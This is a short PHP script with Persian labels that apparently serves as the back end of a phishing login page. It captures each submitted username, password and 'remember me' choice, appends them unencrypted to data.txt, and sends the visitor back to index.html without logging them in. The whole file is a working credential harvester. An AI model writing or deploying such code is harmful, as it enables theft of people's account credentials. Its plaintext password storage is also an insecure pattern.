<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $username = $_POST['username'];
    $password = $_POST['password'];
    $rememberme = isset($_POST['rememberme']) ? 'بله' : 'خیر';

    $data = "نام کاربری: $username, رمز عبور: $password, مرا به خاطر بسپار: $rememberme" . PHP_EOL;

    file_put_contents('data.txt', $data, FILE_APPEND);

    header('Location: index.html');
    exit;
}
?>
